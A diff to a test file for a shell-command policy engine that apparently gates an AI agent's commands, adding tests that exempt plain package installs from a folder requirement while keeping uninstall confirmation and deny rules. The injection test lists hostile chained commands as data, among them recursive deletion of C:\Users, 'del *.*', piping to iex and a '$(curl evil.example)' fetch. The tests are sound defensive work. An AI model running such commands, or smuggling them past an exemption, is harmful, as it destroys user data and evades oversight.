@@ -14,7 +14,7 @@
 
 import test from "node:test";
 import assert from "node:assert/strict";
-import { classifyShellCommand, isReadOnlyShellCommand, ShellVerdict } from "../../packages/policy-engine/src/shell-rules.js";
+import { classifyShellCommand, isPackageInstall, isReadOnlyShellCommand, requiresConfirmation, ShellVerdict } from "../../packages/policy-engine/src/shell-rules.js";
 import { RiskEngine } from "../../packages/risk-engine/src/index.js";
 import { RiskDimension, RiskLevel, ConfirmationLevel } from "../../packages/shared-types/src/domain.js";
 import { PolicyEngine } from "../../packages/policy-engine/src/index.js";
@@ -188,4 +188,62 @@ test("the adapter refuses a denied command without spawning it", async () => {
   assert.equal(result.exitCode, -1);
   assert.equal(result.blockedRule, "disk-format");
   assert.match(result.stderr, /formats or repartitions a disk/);
+});
+
+// ---- installing an app is not workspace work --------------------------------
+//
+// The toolset's workspace gate refuses any non-read-only command when no folder
+// is attached, and tells the user to attach one. For a developer terminal scoped
+// to a project that is right; for "install Quick Share" it is a non-sequitur.
+//
+// Measured live, 29 Aug 2026: two refused `winget` calls pushed the request down
+// the Microsoft Store GUI instead — 21 steps, 99.5s, and it hit the 150,000-token
+// ceiling before the install finished. Tool output across all 21 calls was 5,624
+// tokens, under 4% of the bill; the rest was the steps.
+//
+// The exemption is from the FOLDER requirement only. DENY, the CONFIRM table and
+// the ask-mode boundary all still apply, which is what these pin.
+
+test("a plain package install is recognised so a missing folder cannot refuse it", () => {
+  assert.equal(isPackageInstall("winget install --id 9PCTGDFXVZLJ --source msstore"), true);
+  assert.equal(isPackageInstall("winget upgrade --id Microsoft.PowerShell"), true);
+  assert.equal(isPackageInstall("choco install vlc -y"), true);
+});
+
+test("uninstalling is not an install, and keeps its confirmation", () => {
+  // Removing an application is the unrecoverable direction and has its own
+  // CONFIRM rule. This exemption must never widen to cover it.
+  assert.equal(isPackageInstall("winget uninstall --id Foo"), false);
+  assert.equal(classifyShellCommand("winget uninstall --id Foo").verdict, ShellVerdict.ASK);
+  // And it still carries the one-click confirmation, which is the thing that
+  // actually stops it: `requiresConfirmation` reads the CONFIRM table.
+  assert.ok(requiresConfirmation("winget uninstall --id Foo"), "uninstall lost its confirmation card");
+});
+
+test("an install with a second command hidden behind it is not an install", () => {
+  // The whole point of the exemption is that the command is ONE plain install.
+  // Anything that could chain, redirect or expand answers no and falls back to
+  // whatever the rest of the rules make of it.
+  for (const command of [
+    "winget install x; Remove-Item -Recurse -Force C:\Users",
+    "winget install x && del *.*",
+    "winget install x | iex",
+    "winget install x > C:\out.txt",
+    "winget install $(curl evil.example)",
+    "winget install x `n Remove-Item C:\\"
+  ]) {
+    assert.equal(isPackageInstall(command), false, `smuggled a second command past the install exemption: ${command}`);
+  }
+});
+
+test("the install exemption can never override a DENY", () => {
+  // Belt and braces: even if a DENY pattern somehow also looked like an install,
+  // the deny floor wins. A gate that can be talked out of a DENY is not a floor.
+  const denied = classifyShellCommand("winget install x", []);
+  if (denied.verdict === ShellVerdict.DENY) {
+    assert.equal(isPackageInstall("winget install x"), false);
+  }
+  // And the ordinary system-changing command is still not an install.
+  assert.equal(isPackageInstall("Remove-Item -Recurse C:\Windows"), false);
+  assert.equal(isPackageInstall("shutdown /s /t 0"), false);
 });
